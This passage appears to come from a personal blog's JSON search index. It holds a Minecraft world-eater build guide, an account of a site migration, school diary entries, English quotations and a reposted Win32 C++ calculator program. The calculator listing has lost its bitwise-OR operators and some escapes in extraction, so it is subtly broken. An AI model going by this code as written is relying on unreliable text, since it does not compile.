工作流程：控制杆被触发，轰炸机部分的连杆下压，轰炸机优先被启动，与此同时下方飞行器启动，待飞行器返回，下部分排水机连杆被启动，排水机部分被下压，排水机出发，此后在最靠近控制杆一侧的排水机出发后侧面侦测器会再次触发控制杆，使得装置整体重复上述流程一次，但因为轰炸机排水机都出发了，这里再触发的目的是为了让排水机和轰炸机的连杆再次下压一次，此后就算开机了，经过轰炸，轰炸机先到达返回装置被停下，后排水机到达，排水机到达后重复上述流程 注意：细心地读者可能发现这个世吞的下降有点迷，为啥出发要激活两次呢？第一次是为了让整体高度下降一格，让装置飞过去后被挡住，第二次下降是因为在对面返回时也会下降一格，所以出发点再下降一格才能保证能接住对面返回的装置。 前期准备：大家肯定也注意到了，无论是哪个部分，返回装置，出发装置，亦或是轰炸机和排水机，都是逐渐下降的，那么不难得知这个下降的区域需要提前清理，因此在出发和返回装置的下方需要提前炸好下降的壕沟，一定要保证宽度够，不然下降出问题后是很麻烦的。同时侧面可以选择用铁砧墙或者水墙来阻挡空置域周围被炸得不平整，如果想偷懒不做这个步骤切记要把周围的水清理干净防止轰炸过程中流进来造成意外。 具体的建造技巧：强烈推荐Litematica投影模组，使用它可以确保排水机和轰炸机的高度减少自己测试难度（因为高度不合适可能导致排水机被轰炸机炸到），而且最重要的一点是，使用它可以保证你做的每个部分的统一性，并且这个模组可以查错，你可以一目了然看到错误的地方。而且这个模组还有黑科技——凭空放置，就是可以对着空气放置方块（只能在采用Vanila香草端也就是官方服务端的服务器使用），这样一来可以极大程度的方便你进行高空作业，因为有时候一些元件的朝向很难摆放有了这个东西，势必令你的建造过程事半功倍。你也许会问我用的投影，原作者李芒果的存档世吞太小怎么办，这个好说，你通过平移投影的位置，就可以达到无限拓展的目的啦。同时利用这个模组，你将整体结构沿着Y轴下移，可以利用虚影来判断壕沟的宽度是否合适，或者是建造世吞的具体位置，使得下降空间畅通无阻。利用这些特性（还包括镜像和旋转）就可以把投影出来的虚影安放在合适的位置。还有一点就是一定要确定好返回侧位置避免因为没有对准，导致需要拆掉重来，这也是很难受的。 一些小细节：一定要注意触发部分的二次触发控制杆的侦测器位置！！！不然需要对芒果的原设计小魔改一下才能正常二次下降。 只有实际动手建造才能有所收获，祝大家都能早日做出世吞！","categories":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://zwh-china.github.io/categories/Minecraft/"}],"tags":[]},{"title":"记一次略微曲折的站点搬迁过程","slug":"记一次略微曲折的站点搬迁过程","date":"2020-04-21T18:19:35.000Z","updated":"2021-04-20T21:15:38.431Z","comments":true,"path":"2020/04/22/记一次略微曲折的站点搬迁过程/","link":"","permalink":"https://zwh-china.github.io/2020/04/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%95%A5%E5%BE%AE%E6%9B%B2%E6%8A%98%E7%9A%84%E7%AB%99%E7%82%B9%E6%90%AC%E8%BF%81%E8%BF%87%E7%A8%8B/","excerpt":"","text":"昨晚忽然一时心潮涌动，想到把当初2017年建的博客（也就是你现在看到的这个）恢复，于是便开始了一阵折腾。先是从netsrang下载了Xshell和Xftp，吐槽一下官方CDN下载速度真滴慢。然后我从DropBox（u1s1我带宽基本能跑满）下载了2017年11月份关站前的最后一次备份，然后用Xftp上传到了虚拟机。接着使用宝塔面板对运行环境进行了搭建和配置，正当一切顺利就要恢复数据库时发现phpMyAdmin进不去Access Denied？结果上网百度说要改apache的配置结果我发现根本就没有那个配置选项，又找了一波又有说改phpMyAdmin配置的，然而我根本就没在apache的根目录找到，然后我就看了一下apache的配置文件发现根本没监听php那个管理界面端口，然后我就稀里糊涂的加上了，结果发现保存不了，端口已经被监听了。好家伙原来是宝塔用了virtuehost，行吧那我去改它的配置，按照网上说的把Deny From All改掉发现还是没用，emm，真是劝退啊，我心想。最后我想了想，emm淦，直接卸载apache和phpmyadmin，重装，然而还是没用，我把宝塔界面的phpmyadmin关闭后在进入发现不提示无权限访问了，告诉我站点被关闭，看来php本身是没啥问题了，后来又折腾了一会还是没用。我便使出了绝招用Nginx，它的配置比较容易懂，于是我便重装了，发现还是进不去还是访问被拒，emm，只好看看Nginx的配置，发现原来是不靠谱的宝塔把路径设置错了，phpmyadmin安装后目录里还有一个子目录，而配置文件只是指向一级目录，emm原来如此。总算是把数据库管理搞定了。然而我恢复数据库后改了wp-option表的域名后发现2-3分钟才能进网站主页。这又是什么鬼？！我简直要崩溃了，真是问题多多。我观察浏览器的提示信息，发现尽管我更改了option表的域名但是仍有少量链接仍旧是我旧的已经停用的域名，这就导致浏览器一直尝试链接这个失效地址直到超时为止。好家伙，赶紧去phpmyadmin数据库改了一波，直接替换了含有老域名的字段。这下舒服了，速度正常了。诶~我怎么所有文章都进不去404 Not Found！赶紧百度了一下发现是伪静态设置错误，我这才想起来当初我建站用的脚本，伪静态这部我直接没有设置，哎，赶紧回宝塔设置了一下伪静态。终于一切又都恢复正常了！看看表已经是凌晨2点。困~~","categories":[{"name":"uncategorized","slug":"uncategorized","permalink":"https://zwh-china.github.io/categories/uncategorized/"}],"tags":[]},{"title":"观测--月球","slug":"观测-月球","date":"2017-11-08T04:42:48.000Z","updated":"2021-04-20T21:15:38.429Z","comments":true,"path":"2017/11/08/观测-月球/","link":"","permalink":"https://zwh-china.github.io/2017/11/08/%E8%A7%82%E6%B5%8B-%E6%9C%88%E7%90%83/","excerpt":"","text":"2017年11月4日周六，东风高中天文台观月活动。","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"期中考试的临近","slug":"期中考试的临近","date":"2017-11-06T10:01:47.000Z","updated":"2021-04-20T21:15:38.426Z","comments":true,"path":"2017/11/06/期中考试的临近/","link":"","permalink":"https://zwh-china.github.io/2017/11/06/%E6%9C%9F%E4%B8%AD%E8%80%83%E8%AF%95%E7%9A%84%E4%B8%B4%E8%BF%91/","excerpt":"","text":"高中的学习节奏果然与初中没法比。才送走了月考，期中考试马上接踵而至，唉~压力很大，11月20日可是说到就到。而且这次成绩对分班有着不可小觑的影响。然而文科短板的我很慌啊！嗯，接下来着重攻物理，放假的话看看小科，毕竟还没分班得要综合发展。In a word I must work harder.为我自己加油！！！","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"c语言实现窗体计算器（研究用）","slug":"c语言实现窗体计算器（研究用）","date":"2017-10-17T05:03:03.000Z","updated":"2021-04-20T21:15:38.424Z","comments":true,"path":"2017/10/17/c语言实现窗体计算器（研究用）/","link":"","permalink":"https://zwh-china.github.io/2017/10/17/c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%AA%97%E4%BD%93%E8%AE%A1%E7%AE%97%E5%99%A8%EF%BC%88%E7%A0%94%E7%A9%B6%E7%94%A8%EF%BC%89/","excerpt":"","text":"// Calculator.cpp : 定义应用程序的入口点。// #include “stdafx.h”#include “Calculator.h”#include using namespace std; #define MAX_LOADSTRING 100 // 全局变量:HINSTANCE hInst;// 当前实例TCHAR szTitle[MAX_LOADSTRING];// 标题栏文本TCHAR szWindowClass[MAX_LOADSTRING];// 主窗口类名map&lt;HWND, RECT&gt; mapSubHWndRect;//子窗口区域集合SIZE szPreWnd;//窗口之前的大小 HWND hWndText = NULL;HHOOK hKeyHook = NULL; // 此代码模块中包含的函数的前向声明:ATOMMyRegisterClass(HINSTANCE hInstance);BOOLInitInstance(HINSTANCE, int);LRESULT CALLBACKWndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACKAbout(HWND, UINT, WPARAM, LPARAM);HWND CreateStaticForMainWnd(HWND hWnd, LPCTSTR strText, LONG lStyle, int x, int y, int iWidth, int iHeight);void CreateButtonForMainWnd(HWND hWnd, int iID, LPCTSTR strText, int x, int y, int iWidth, int iHeight);LRESULT CALLBACK HookKeyProc(int iCode, WPARAM wParam, LPARAM lParam);void OnShowNum(int iNum); int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow){ UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 MSG msg; HACCEL hAccelTable; // 初始化全局字符串 LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadString(hInstance, IDC_CALCULATOR, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) { return FALSE; } hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_CALCULATOR)); // 主消息循环: while (GetMessage(&amp;msg, NULL, 0, 0)) { if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) { TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); } } return (int) msg.wParam;} //// 函数: MyRegisterClass()//// 目的: 注册窗口类。//// 注释://// 仅当希望// 此代码与添加到 Windows 95 中的“RegisterClassEx”// 函数之前的 Win32 系统兼容时，才需要此函数及其用法。调用此函数十分重要，// 这样应用程序就可以获得关联的// “格式正确的”小图标。//ATOM MyRegisterClass(HINSTANCE hInstance){ WNDCLASSEX wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style= CS_HREDRAW CS_VREDRAW; wcex.lpfnWndProc= WndProc; wcex.cbClsExtra= 0; wcex.cbWndExtra= 0; wcex.hInstance= hInstance; wcex.hIcon= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON3)); wcex.hCursor= LoadCursor(NULL, IDC_ARROW); wcex.hbrBackground= (HBRUSH)(COLOR_BTNFACE+1); wcex.lpszMenuName= MAKEINTRESOURCE(IDC_CALCULATOR); wcex.lpszClassName= szWindowClass; wcex.hIconSm= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_ICON2)); return RegisterClassEx(&amp;wcex);} //// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释://// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow){ HWND hWnd; hInst = hInstance; // 将实例句柄存储在全局变量中 // hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW &amp; ~WS_MAXIMIZEBOX,// CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL); hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW &amp; ~WS_MAXIMIZEBOX WS_CLIPCHILDREN, 500, 200, 228, 322, NULL, NULL,hInstance, NULL); if (!hWnd) { return FALSE; } SetWindowText(hWnd,L”计算器”); ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;} //// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND- 处理应用程序菜单// WM_PAINT- 绘制主窗口// WM_DESTROY- 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam){ int wmId, wmEvent; PAINTSTRUCT ps; HDC hdc; switch (message) { case WM_CREATE: { RECT rect = {0}; GetClientRect(hWnd, &amp;rect); szPreWnd.cx = rect.right - rect.left; szPreWnd.cy = rect.bottom - rect.top; CreateStaticForMainWnd(hWnd, \\_T(&quot;&quot;), WS\\_CHILDWS\\_VISIBLE, 10, 15, 195, 50); hWndText = CreateStaticForMainWnd(hWnd, \\_T(&quot;0&quot;), WS\\_CHILDWS\\_VISIBLESS\\_RIGHT, 12, 35, 191, 20); CreateStaticForMainWnd(hWnd, \\_T(&quot;&quot;), WS\\_CHILDWS\\_VISIBLESS\\_GRAYFRAME, 10, 15, 195, 50); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_MC, \\_T(&quot;MC&quot;), 10, 75, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_MR, \\_T(&quot;MR&quot;), 50, 75, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_MS, \\_T(&quot;MS&quot;), 90, 75, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_M\\_ADD, \\_T(&quot;M+&quot;), 130, 75, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_M\\_SUBTRACT, \\_T(&quot;M-&quot;), 170, 75, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_DELETE, \\_T(&quot;Del&quot;), 10, 105, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_CE, \\_T(&quot;CE&quot;), 50, 105, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_C, \\_T(&quot;C&quot;), 90, 105, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_AS, \\_T(&quot;+-&quot;), 130, 105, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_TICE, \\_T(&quot;V&quot;), 170, 105, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_NUM7, \\_T(&quot;7&quot;), 10, 135, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_NUM8, \\_T(&quot;8&quot;), 50, 135, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_NUM9, \\_T(&quot;9&quot;), 90, 135, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_DIVIDE, \\_T(&quot;/&quot;), 130, 135, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_PERCENT, \\_T(&quot;%&quot;), 170, 135, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_NUM4, \\_T(&quot;4&quot;), 10, 165, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_NUM5, \\_T(&quot;5&quot;), 50, 165, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_NUM6, \\_T(&quot;6&quot;), 90, 165, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_MULTIPLY, \\_T(&quot;\\*&quot;), 130, 165, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_RECIPROCAL, \\_T(&quot;1/x&quot;), 170, 165, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_NUM1, \\_T(&quot;1&quot;), 10, 195, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_NUM2, \\_T(&quot;2&quot;), 50, 195, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_NUM3, \\_T(&quot;3&quot;), 90, 195, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_SUBTRACT, \\_T(&quot;-&quot;), 130, 195, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_EQUAL, \\_T(&quot;=&quot;), 170, 195, 35, 55); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_NUM0, \\_T(&quot;0&quot;), 10, 225, 75, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_POINT, \\_T(&quot;.&quot;), 90, 225, 35, 25); CreateButtonForMainWnd(hWnd, ID\\_BTN\\_ADD, \\_T(&quot;+&quot;), 130, 225, 35, 25); hKeyHook = SetWindowsHookEx(WH\\_KEYBOARD, HookKeyProc, NULL, GetCurrentThreadId()); break; &#125; case WM_COMMAND: wmId = LOWORD(wParam); wmEvent = HIWORD(wParam); if (wmId == ID_BTN_MC) { SetWindowText(hWndText, _T(“MC”)); } else if (wmId == ID_BTN_MR) { SetWindowText(hWndText, _T(“MR”)); } else if (wmId == ID_BTN_MS) { SetWindowText(hWndText, _T(“MS”)); } else if (wmId == ID_BTN_M_ADD) { SetWindowText(hWndText, _T(“M+”)); } else if (wmId == ID_BTN_M_SUBTRACT) { SetWindowText(hWndText, _T(“M-“)); } else if (wmId == ID_BTN_DELETE) { SetWindowText(hWndText, _T(“DEL”)); } else if (wmId == ID_BTN_CE) { SetWindowText(hWndText, _T(“CE”)); } else if (wmId == ID_BTN_C) { SetWindowText(hWndText, _T(“C”)); } else if (wmId == ID_BTN_AS) { SetWindowText(hWndText, _T(“+-“)); } else if (wmId == ID_BTN_TICE) { SetWindowText(hWndText, _T(“V”)); } else if (wmId == ID_BTN_DIVIDE) { SetWindowText(hWndText, _T(“/“)); } else if (wmId == ID_BTN_PERCENT) { SetWindowText(hWndText, _T(“%”)); } else if (wmId == ID_BTN_MULTIPLY) { SetWindowText(hWndText, _T(“*“)); } else if (wmId == ID_BTN_RECIPROCAL) { SetWindowText(hWndText, _T(“1/x”)); } else if (wmId == ID_BTN_SUBTRACT) { SetWindowText(hWndText, _T(“-“)); } else if (wmId == ID_BTN_EQUAL) { SetWindowText(hWndText, _T(“=”)); } else if (wmId == ID_BTN_POINT) { SetWindowText(hWndText, _T(“.”)); } else if (wmId == ID_BTN_ADD) { SetWindowText(hWndText, _T(“+”)); } else if (wmId&gt;=ID_BTN_NUM0 &amp;&amp; wmId&lt;=ID_BTN_NUM9) { OnShowNum(wmId-ID_BTN_NUM0+48); } // 分析菜单选择: switch (wmId) &#123; case IDM\\_ABOUT: //DialogBox(hInst, MAKEINTRESOURCE(IDD\\_ABOUTBOX), hWnd, About); ::ShellAbout(hWnd,L&quot;计算器&quot;,L&quot;雁子TEST-123456&quot;,NULL); break; case IDM\\_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; break; case WM_PAINT: hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此添加任意绘图代码… EndPaint(hWnd, &amp;ps); break; case WM_DESTROY: UnhookWindowsHookEx(hKeyHook); PostQuitMessage(0); break; case WM_SIZE: { WORD x = LOWORD(lParam); WORD y = HIWORD(lParam); double dx = (double)x/szPreWnd.cx; double dy = (double)y/szPreWnd.cy; for (map&lt;HWND, RECT&gt;::iterator it=mapSubHWndRect.begin(); it!=mapSubHWndRect.end(); ++it) { pair&lt;HWND, RECT&gt; pi = *it; MoveWindow(pi.first, pi.second.left*dx, pi.second.top*dy, (pi.second.right-pi.second.left)*dx, (pi.second.bottom-pi.second.top)*dy, TRUE); } } break; default: return DefWindowProc(hWnd, message, wParam, lParam); } return 0;} // “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam){ UNREFERENCED_PARAMETER(lParam); switch (message) { case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK LOWORD(wParam) == IDCANCEL) { EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; } break; } return (INT_PTR)FALSE;} HWND CreateStaticForMainWnd(HWND hWnd, LPCTSTR strText, LONG lStyle, int x, int y, int iWidth, int iHeight){ HWND hWndResult = CreateWindow(_T(“STATIC”), strText, lStyle, x, y, iWidth, iHeight, hWnd, NULL, hInst, NULL); RECT rect = {x,y,x+iWidth,y+iHeight}; mapSubHWndRect.insert(pair&lt;HWND,RECT&gt;(hWndResult,rect)); return hWndResult;} void CreateButtonForMainWnd(HWND hWnd, int iID, LPCTSTR strText, int x, int y, int iWidth, int iHeight){ HWND hWndTemp= CreateWindow(_T(“BUTTON”), strText, WS_CHILDWS_VISIBLE,x, y, iWidth, iHeight, hWnd, (HMENU)iID, hInst, NULL); RECT rect = {x,y,x+iWidth,y+iHeight}; mapSubHWndRect.insert(pair&lt;HWND,RECT&gt;(hWndTemp,rect));} LRESULT CALLBACK HookKeyProc(int iCode, WPARAM wParam, LPARAM lParam){ if (iCode == HC_ACTION) { UINT nFlags = HIWORD(lParam); BOOL bKeyDown = 0 == (nFlags &amp; KF_UP); if (bKeyDown) &#123; //数字键的0-9 if (wParam&gt;=VK\\_NUMPAD0 &amp;&amp; wParam&lt;=VK\\_NUMPAD9) &#123; //转换成主键盘的0-9 wParam -= 0x30; &#125; //主键盘的0-9 if (wParam&gt;=0x30 &amp;&amp; wParam&lt;=0x39) &#123; OnShowNum(wParam); &#125; &#125; } return CallNextHookEx(hKeyHook, iCode, wParam, lParam);} void OnShowNum(int iNum){ TCHAR tc[2] = {0}; tc[0] = (TCHAR)iNum; TCHAR tcCur[100] = {0}; GetWindowText(hWndText, tcCur, 100); LPCTSTR str = lstrcat(tcCur, tc); if (lstrlen(str) &gt; 50) { str = _T(“”); } SetWindowText(hWndText, str);} 转载自CSDN http://blog.csdn.net/goosdy/article/details/8759901","categories":[{"name":"c语言学习","slug":"c语言学习","permalink":"https://zwh-china.github.io/categories/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"英语好句","slug":"英语好句","date":"2017-10-16T15:07:09.000Z","updated":"2021-04-20T21:15:38.422Z","comments":true,"path":"2017/10/16/英语好句/","link":"","permalink":"https://zwh-china.github.io/2017/10/16/%E8%8B%B1%E8%AF%AD%E5%A5%BD%E5%8F%A5/","excerpt":"","text":"乐观面对人生是我们每天的必修课，只有每天乐观，才能做到每天进步一点点。 1.Accept disappointment and learn to persevere, to pursue your dream despite pitfalls. Learn to turn negatives into positives, and you’ll do much better in life. 接受挫折并学会坚持，不畏风险地追求你的梦想。学会把消极因素转化为积极因素，今后在生活中你就能做得好得多。 2.The brightest future will always be based on a forgotten past. You can’t go on will in life until you let go off your past failures . 一个美好的未来永远在于你能否忘却过去，你若没法忘记过去的失败，便不能活得精彩。 3.There is no doubt that optimism is a powerful combination of thinking and feeling that shifts us to a higher level of functioning. 毫无疑问，乐观是一种思考与情感强有力的结合，将我们推向更高层次的能力运作。 4.Even when the cold winds blow and the world seems to be covered in foggy shadows,the goodness of life lives on. Open your eyes, open your heart, and you will see that goodness is everywhere. 即使寒风袭来，整个世界似乎被雾气笼罩，人生的美好依然会存在。睁开你的双眼，打开你的心扉，你就会发现人生美好无处不在。 5.Celebrate every day of your life! Let the spirit of holiday fill each corner of your heart. Why not? You live your life to its fullest and move towards your dreams! 欢度生活中的每一天，让度假的心情充满你的心田，为什么不呢? 朝着最美满的生活，朝着你的梦想迈进! 6.Whether happiness and sorrow in life would finally become memories. Why not face them with smile. 一生中无论快乐与悲伤，到最后都将成为回忆，不妨学着一笑置之的胸怀。 7.No matter what you are suffering from now, do not merely complain about the unfairness of our destiny and maintain low-spirited all the time. There are no such setbacks that we could not overcome. Only those who have no confidence and courage to overcome setbacks will be defeated at last! 从现在开始无论遭遇什么磨难，都不要一味抱怨命运不公，从此一蹶不振。人生没有过不去的坎，只有那些缺乏信心和勇气人才会被挫折击败。 8.However mean your life is, meet it and live it; do not shun it and call it hard names. 不论你的生活如何卑微，你都要面对它生活，不要躲避它，更别用恶言咒骂它。 9.Difficulties arise in the lives of us all. What is most important is dealing with the hard times, coping with the changes, and getting through to the other side where the sun is still shining just for you. 生活中困难在所难免，最重要的是要挺过艰难的时刻，积极应对种种变故，冲破黎明前的黑暗，你终会看到只属于自己的灿烂阳光。 10.When you are faced with so many negative and draining situation, realize how minuscule problems will seem when you view your life as a whole ，and remember the positive things. 当面对重重困难的时候，应该意识到相对于你的整个生命，这些难题其实是微不足道的，铭记你生命中美好的东西。 摘记小猿搜题","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"一节心理课","slug":"一节心理课","date":"2017-10-16T05:03:23.000Z","updated":"2021-04-20T21:15:38.420Z","comments":true,"path":"2017/10/16/一节心理课/","link":"","permalink":"https://zwh-china.github.io/2017/10/16/%E4%B8%80%E8%8A%82%E5%BF%83%E7%90%86%E8%AF%BE/","excerpt":"","text":"月考过后的第一个星期一，也就是今天的班会课上，学校组织了一次心理课。我们都坐在教室里通过大屏幕听课。课程的主题是注意力，其中比较有趣的就是一个注意力测试实验，一群人在舞台上传篮球，而我们需要注意球被传给穿白衬衫的同学的次数，然而我才看了几秒就晕了。。不过很凑巧我以前看过这个实验，得出的结论就是当人们专注于某件事就会忽略周围发生的别的事。正因为如此我们都注重于对传球次数的观察，却忽视了大猩猩和舞台后幕布的颜色变化（雾）。所以嗯 TO conclude我想说这是人类的特性怪不了我，所以呢写作业还是不要听音乐的好（不过我貌似没手机也听不了，尴尬。） Ok, That is all for today’s Blog","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"-月考过后……","slug":"月考过后","date":"2017-10-12T14:47:14.000Z","updated":"2021-04-20T21:15:38.418Z","comments":true,"path":"2017/10/12/月考过后/","link":"","permalink":"https://zwh-china.github.io/2017/10/12/%E6%9C%88%E8%80%83%E8%BF%87%E5%90%8E/","excerpt":"","text":"诶，数学算是炸了全校最高130多分。物理全校两个优秀，这怕是boom。尤其是历史，什么郡国并行制感觉都是第一次听说。黄赤交角是啥？╮（╯＿╰）╭ 无奈～ 吐槽blog →_→","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"啊哈!日常班会","slug":"啊哈-日常班会","date":"2017-10-09T05:23:42.000Z","updated":"2021-04-20T21:15:38.416Z","comments":true,"path":"2017/10/09/啊哈-日常班会/","link":"","permalink":"https://zwh-china.github.io/2017/10/09/%E5%95%8A%E5%93%88-%E6%97%A5%E5%B8%B8%E7%8F%AD%E4%BC%9A/","excerpt":"","text":"今天的班会主题呢，是”_离自己目标的距离_“。唉强行被许泽耀同学拉上去尬聊一番，讲的我都不好意思了…. 至于亮点当然就是班主任卢老师的发言了，顺便学了三个单词gentle 、noability 还有一个忘了（貌似是关于亚里士多德）。嗯分别代表举止行为得体、贵族血统。当然喽重点肯定就在于亚里士多德的那个词和gentle的讲解了。","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"月考≥﹏≤","slug":"月考≥﹏≤","date":"2017-10-07T14:10:24.000Z","updated":"2021-04-20T21:15:38.413Z","comments":true,"path":"2017/10/07/月考≥﹏≤/","link":"","permalink":"https://zwh-china.github.io/2017/10/07/%E6%9C%88%E8%80%83%E2%89%A5%EF%B9%8F%E2%89%A4/","excerpt":"","text":"完了！下周二月考，物理、地理、政治怕是要炸。Hope God bless me.物理相当晕，匀速直线运动的规律都没玩转。 ╮（╯＿╰）╭ 无奈","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]}],"categories":[{"name":"CTF学习","slug":"CTF学习","permalink":"https://zwh-china.github.io/categories/CTF%E5%AD%A6%E4%B9%A0/"},{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"},{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"},{"name":"c语言学习","slug":"c语言学习","permalink":"https://zwh-china.github.io/categories/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"Web","slug":"Web","permalink":"https://zwh-china.github.io/categories/Web/"},{"name":"计算机知识","slug":"计算机知识","permalink":"https://zwh-china.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9F%A5%E8%AF%86/"},{"name":"Minecraft","slug":"Minecraft","permalink":"https://zwh-china.github.io/categories/Minecraft/"},{"name":"成长路上写给自己","slug":"成长路上写给自己","permalink":"https://zwh-china.github.io/categories/%E6%88%90%E9%95%BF%E8%B7%AF%E4%B8%8A%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1/"},{"name":"uncategorized","slug":"uncategorized","permalink":"https://zwh-china.github.io/categories/uncategorized/"}],"tags":[]}